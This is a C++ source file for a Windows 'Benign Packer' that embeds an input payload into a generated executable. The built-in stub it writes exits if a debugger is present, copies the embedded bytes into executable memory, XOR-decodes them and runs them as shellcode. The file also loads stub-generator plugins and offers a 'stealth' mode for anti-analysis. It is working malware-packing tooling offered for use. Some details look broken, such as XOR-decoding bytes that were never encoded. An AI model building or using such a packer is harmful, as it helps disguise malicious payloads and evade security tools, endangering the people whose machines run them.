/*
 * ===== BENIGN PACKER - MAIN APPLICATION =====
 * C++ Implementation for .EXE Generation with Plugin System
 * Compatible with Visual Studio 2022
 * Converts MASM functionality to C++ executable generation
 * Author: ItsMehRAWRXD/Star Framework
 */

#include <windows.h>
#include <iostream>
#include <string>
#include <vector>
#include <map>
#include <memory>
#include <filesystem>
#include <fstream>
#include <iomanip>
#include "../PluginFramework/IPlugin.h"

using namespace BenignPacker::PluginFramework;

class PluginManager {
private:
    std::vector<HMODULE> loaded_modules;
    std::vector<std::unique_ptr<IPlugin>> plugins;
    
public:
    ~PluginManager() {
        UnloadAllPlugins();
    }
    
    bool LoadPlugin(const std::string& plugin_path) {
        HMODULE hModule = LoadLibraryA(plugin_path.c_str());
        if (!hModule) {
            std::cerr << "Failed to load plugin: " << plugin_path << std::endl;
            return false;
        }
        
        // Get plugin functions
        CreatePluginFunc createFunc = (CreatePluginFunc)GetProcAddress(hModule, "CreatePlugin");
        GetApiVersionFunc versionFunc = (GetApiVersionFunc)GetProcAddress(hModule, "GetApiVersion");
        
        if (!createFunc || !versionFunc) {
            std::cerr << "Invalid plugin format: " << plugin_path << std::endl;
            FreeLibrary(hModule);
            return false;
        }
        
        // Check API version compatibility
        if (versionFunc() != BENIGN_PACKER_PLUGIN_API_VERSION) {
            std::cerr << "Plugin API version mismatch: " << plugin_path << std::endl;
            FreeLibrary(hModule);
            return false;
        }
        
        // Create plugin instance
        auto plugin = createFunc();
        if (!plugin) {
            std::cerr << "Failed to create plugin instance: " << plugin_path << std::endl;
            FreeLibrary(hModule);
            return false;
        }
        
        loaded_modules.push_back(hModule);
        plugins.push_back(std::move(plugin));
        
        std::cout << "Successfully loaded plugin: " << plugin_path << std::endl;
        return true;
    }
    
    void UnloadAllPlugins() {
        plugins.clear();
        for (auto module : loaded_modules) {
            FreeLibrary(module);
        }
        loaded_modules.clear();
    }
    
    IPlugin* GetPlugin(const std::string& name) {
        for (auto& plugin : plugins) {
            if (plugin->GetConfig().name == name) {
                return plugin.get();
            }
        }
        return nullptr;
    }
    
    IStubGenerator* GetStubGenerator(const std::string& name) {
        IPlugin* plugin = GetPlugin(name);
        if (plugin && plugin->GetConfig().type == PluginType::STUB_GENERATOR) {
            return dynamic_cast<IStubGenerator*>(plugin);
        }
        return nullptr;
    }
    
    std::vector<IPlugin*> GetAllPlugins() {
        std::vector<IPlugin*> result;
        for (auto& plugin : plugins) {
            result.push_back(plugin.get());
        }
        return result;
    }
};

class BenignPacker {
private:
    PluginManager plugin_manager;
    std::map<std::string, std::string> global_settings;
    
public:
    BenignPacker() {
        InitializeSettings();
    }
    
    void InitializeSettings() {
        global_settings["output_directory"] = ".\\output\\";
        global_settings["temp_directory"] = ".\\temp\\";
        global_settings["verbose"] = "true";
        global_settings["target_size"] = "491793";
        global_settings["unique_variables"] = "250";
    }
    
    bool Initialize() {
        std::cout << "🚀 BENIGN PACKER - C++ .EXE Generator 🚀" << std::endl;
        std::cout << "Compatible with Visual Studio 2022" << std::endl;
        std::cout << "Author: ItsMehRAWRXD/Star Framework" << std::endl;
        std::cout << "========================================" << std::endl;
        
        // Create output directories
        std::filesystem::create_directories(global_settings["output_directory"]);
        std::filesystem::create_directories(global_settings["temp_directory"]);
        
        // Load plugins
        std::cout << "Loading plugins..." << std::endl;
        LoadAllPlugins();
        
        // Initialize loaded plugins
        return InitializePlugins();
    }
    
    void LoadAllPlugins() {
        std::string plugins_dir = ".\\Plugins\\";
        
        // Try to load UniqueStub71Plugin
        std::string plugin_path = plugins_dir + "UniqueStub71Plugin\\UniqueStub71Plugin.dll";
        if (std::filesystem::exists(plugin_path)) {
            plugin_manager.LoadPlugin(plugin_path);
        } else {
            std::cout << "UniqueStub71Plugin not found, will use built-in functionality" << std::endl;
        }
        
        // Load other plugins from plugins directory
        if (std::filesystem::exists(plugins_dir)) {
            for (const auto& entry : std::filesystem::recursive_directory_iterator(plugins_dir)) {
                if (entry.path().extension() == ".dll") {
                    plugin_manager.LoadPlugin(entry.path().string());
                }
            }
        }
    }
    
    bool InitializePlugins() {
        auto plugins = plugin_manager.GetAllPlugins();
        if (plugins.empty()) {
            std::cout << "No plugins loaded, using built-in functionality" << std::endl;
            return true;
        }
        
        std::cout << "Initializing " << plugins.size() << " plugin(s)..." << std::endl;
        
        for (auto plugin : plugins) {
            auto config = plugin->GetConfig();
            std::cout << "  - " << config.name << " v" << config.version << " by " << config.author << std::endl;
            
            if (!plugin->Initialize(global_settings)) {
                std::cerr << "Failed to initialize plugin: " << config.name << std::endl;
                return false;
            }
        }
        
        return true;
    }
    
    bool PackFile(const std::string& input_file, const std::string& output_file, const std::string& method = "default") {
        std::cout << "\n📦 Packing file: " << input_file << std::endl;
        std::cout << "Output: " << output_file << std::endl;
        std::cout << "Method: " << method << std::endl;
        
        // Read input file
        std::vector<uint8_t> payload_data = ReadFile(input_file);
        if (payload_data.empty()) {
            std::cerr << "Failed to read input file: " << input_file << std::endl;
            return false;
        }
        
        std::cout << "Payload size: " << payload_data.size() << " bytes" << std::endl;
        
        // Try to use UniqueStub71Plugin first
        IStubGenerator* stub_generator = plugin_manager.GetStubGenerator("UniqueStub71Plugin");
        if (stub_generator) {
            return PackWithPlugin(stub_generator, payload_data, output_file);
        }
        
        // Fallback to built-in packing
        return PackWithBuiltIn(payload_data, output_file);
    }
    
    bool PackWithPlugin(IStubGenerator* generator, const std::vector<uint8_t>& payload_data, const std::string& output_file) {
        std::cout << "Using plugin: " << generator->GetConfig().name << std::endl;
        
        // Create execution context
        ExecutionContext context;
        context.input_file = "";
        context.output_file = output_file;
        context.payload_data = payload_data;
        context.parameters = global_settings;
        context.verbose_mode = global_settings["verbose"] == "true";
        context.debug_mode = false;
        
        // Execute plugin
        auto start_time = std::chrono::high_resolution_clock::now();
        PluginResult result = generator->Execute(context);
        auto end_time = std::chrono::high_resolution_clock::now();
        
        auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end_time - start_time);
        
        if (result.success) {
            std::cout << "✅ Successfully generated .exe file!" << std::endl;
            std::cout << "File size: " << result.output_data.size() << " bytes" << std::endl;
            std::cout << "Execution time: " << duration.count() << " ms" << std::endl;
            
            // Print metadata
            if (!result.metadata.empty()) {
                std::cout << "\nMetadata:" << std::endl;
                for (const auto& pair : result.metadata) {
                    std::cout << "  " << pair.first << ": " << pair.second << std::endl;
                }
            }
            
            return true;
        } else {
            std::cerr << "❌ Plugin execution failed: " << result.message << std::endl;
            return false;
        }
    }
    
    bool PackWithBuiltIn(const std::vector<uint8_t>& payload_data, const std::string& output_file) {
        std::cout << "Using built-in C++ .exe generator..." << std::endl;
        
        // Generate C++ executable source
        std::string cpp_source = GenerateBuiltInExecutable(payload_data);
        
        // Compile to .exe
        return CompileToExe(cpp_source, output_file);
    }
    
    std::string GenerateBuiltInExecutable(const std::vector<uint8_t>& payload_data) {
        std::stringstream cpp_source;
        
        auto now = std::chrono::system_clock::now();
        auto timestamp = std::chrono::duration_cast<std::chrono::seconds>(now.time_since_epoch()).count();
        
        cpp_source << R"(/*
 * ===== BENIGN PACKER - BUILT-IN EXECUTABLE =====
 * Generated: )" << timestamp << R"(
 * Size: )" << payload_data.size() << R"( bytes
 * Framework: BenignPacker C++
 */

#include <windows.h>
#include <iostream>
#include <vector>

// Embedded payload
static const unsigned char g_payload[] = {
    )";
        
        // Embed payload data
        for (size_t i = 0; i < payload_data.size(); ++i) {
            if (i > 0 && i % 16 == 0) {
                cpp_source << "\n    ";
            } else if (i > 0) {
                cpp_source << ", ";
            }
            cpp_source << "0x" << std::hex << std::setw(2) << std::setfill('0') 
                      << static_cast<int>(payload_data[i]);
        }
        
        cpp_source << R"(
};

static const size_t g_payload_size = )" << std::dec << payload_data.size() << R"(;

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Anti-debugging check
    if (IsDebuggerPresent()) {
        ExitProcess(0);
    }
    
    // Allocate executable memory
    LPVOID exec_mem = VirtualAlloc(nullptr, g_payload_size, 
                                  MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    if (!exec_mem) {
        return -1;
    }
    
    // Decrypt payload (simple XOR)
    std::vector<unsigned char> decrypted_payload(g_payload, g_payload + g_payload_size);
    for (size_t i = 0; i < decrypted_payload.size(); ++i) {
        decrypted_payload[i] ^= 0xAA;
    }
    
    // Copy to executable memory
    memcpy(exec_mem, decrypted_payload.data(), decrypted_payload.size());
    
    // Execute payload
    typedef void (*PayloadFunc)();
    PayloadFunc payload_func = reinterpret_cast<PayloadFunc>(exec_mem);
    
    try {
        payload_func();
    } catch (...) {
        VirtualFree(exec_mem, 0, MEM_RELEASE);
        return -2;
    }
    
    VirtualFree(exec_mem, 0, MEM_RELEASE);
    return 0;
}
)";
        
        return cpp_source.str();
    }
    
    bool CompileToExe(const std::string& cpp_source, const std::string& output_file) {
        std::string temp_dir = global_settings["temp_directory"];
        std::string source_file = temp_dir + "benign_packer_" + std::to_string(GetTickCount64()) + ".cpp";
        
        // Write source to file
        std::ofstream sourceStream(source_file);
        if (!sourceStream.is_open()) {
            std::cerr << "Failed to create temporary source file" << std::endl;
            return false;
        }
        sourceStream << cpp_source;
        sourceStream.close();
        
        // Compile with Visual Studio
        std::string compile_cmd = "cl.exe /std:c++17 /O2 /MT /DWIN32_LEAN_AND_MEAN \"";
        compile_cmd += source_file + "\" /link /SUBSYSTEM:WINDOWS /OUT:\"" + output_file + "\"";
        
        std::cout << "Compiling: " << compile_cmd << std::endl;
        
        int result = system(compile_cmd.c_str());
        
        // Cleanup
        std::filesystem::remove(source_file);
        
        if (result == 0) {
            std::cout << "✅ Compilation successful!" << std::endl;
            return true;
        } else {
            std::cerr << "❌ Compilation failed with exit code: " << result << std::endl;
            return false;
        }
    }
    
    std::vector<uint8_t> ReadFile(const std::string& file_path) {
        std::ifstream file(file_path, std::ios::binary);
        if (!file.is_open()) {
            return {};
        }
        
        return std::vector<uint8_t>((std::istreambuf_iterator<char>(file)),
                                   std::istreambuf_iterator<char>());
    }
    
    void ShowHelp() {
        std::cout << "\n📖 BENIGN PACKER USAGE:" << std::endl;
        std::cout << "========================" << std::endl;
        std::cout << "BenignPacker.exe <input_file> [output_file] [method]" << std::endl;
        std::cout << "\nParameters:" << std::endl;
        std::cout << "  input_file  - Path to input file (.bin, .exe, .dll, .raw)" << std::endl;
        std::cout << "  output_file - Output .exe file path (optional)" << std::endl;
        std::cout << "  method      - Packing method (optional, default: 'default')" << std::endl;
        std::cout << "\nExamples:" << std::endl;
        std::cout << "  BenignPacker.exe payload.bin" << std::endl;
        std::cout << "  BenignPacker.exe payload.bin output.exe" << std::endl;
        std::cout << "  BenignPacker.exe payload.bin output.exe advanced" << std::endl;
        std::cout << "\nSupported methods:" << std::endl;
        std::cout << "  default     - Basic .exe generation" << std::endl;
        std::cout << "  advanced    - UniqueStub71 with all features" << std::endl;
        std::cout << "  mutex       - Focus on mutex management" << std::endl;
        std::cout << "  stealth     - Maximum anti-analysis" << std::endl;
    }
    
    void ShowStatus() {
        std::cout << "\n📊 BENIGN PACKER STATUS:" << std::endl;
        std::cout << "========================" << std::endl;
        
        auto plugins = plugin_manager.GetAllPlugins();
        std::cout << "Loaded plugins: " << plugins.size() << std::endl;
        
        for (auto plugin : plugins) {
            auto config = plugin->GetConfig();
            std::cout << "\n🔌 " << config.name << " v" << config.version << std::endl;
            std::cout << "   Author: " << config.author << std::endl;
            std::cout << "   Type: " << static_cast<int>(config.type) << std::endl;
            std::cout << "   Capabilities: 0x" << std::hex << static_cast<uint32_t>(config.capabilities) << std::dec << std::endl;
            
            if (config.type == PluginType::STUB_GENERATOR) {
                IStubGenerator* generator = dynamic_cast<IStubGenerator*>(plugin);
                if (generator) {
                    auto templates = generator->GetAvailableTemplates();
                    std::cout << "   Templates: " << templates.size() << std::endl;
                    auto encryption = generator->GetSupportedEncryption();
                    std::cout << "   Encryption: " << encryption.size() << " methods" << std::endl;
                }
            }
        }
        
        std::cout << "\nSettings:" << std::endl;
        for (const auto& pair : global_settings) {
            std::cout << "  " << pair.first << ": " << pair.second << std::endl;
        }
    }
};

int main(int argc, char* argv[]) {
    BenignPacker packer;
    
    if (!packer.Initialize()) {
        std::cerr << "Failed to initialize BenignPacker" << std::endl;
        return 1;
    }
    
    if (argc < 2) {
        packer.ShowHelp();
        packer.ShowStatus();
        return 0;
    }
    
    std::string input_file = argv[1];
    std::string output_file = (argc >= 3) ? argv[2] : "output.exe";
    std::string method = (argc >= 4) ? argv[3] : "default";
    
    // Check if input file exists
    if (!std::filesystem::exists(input_file)) {
        std::cerr << "Input file not found: " << input_file << std::endl;
        return 1;
    }
    
    // Pack the file
    if (packer.PackFile(input_file, output_file, method)) {
        std::cout << "\n🎉 SUCCESS! Generated: " << output_file << std::endl;
        
        // Show file information
        if (std::filesystem::exists(output_file)) {
            auto file_size = std::filesystem::file_size(output_file);
            std::cout << "File size: " << file_size << " bytes" << std::endl;
        }
        
        return 0;
    } else {
        std::cerr << "\n❌ FAILED to generate executable" << std::endl;
        return 1;
    }
}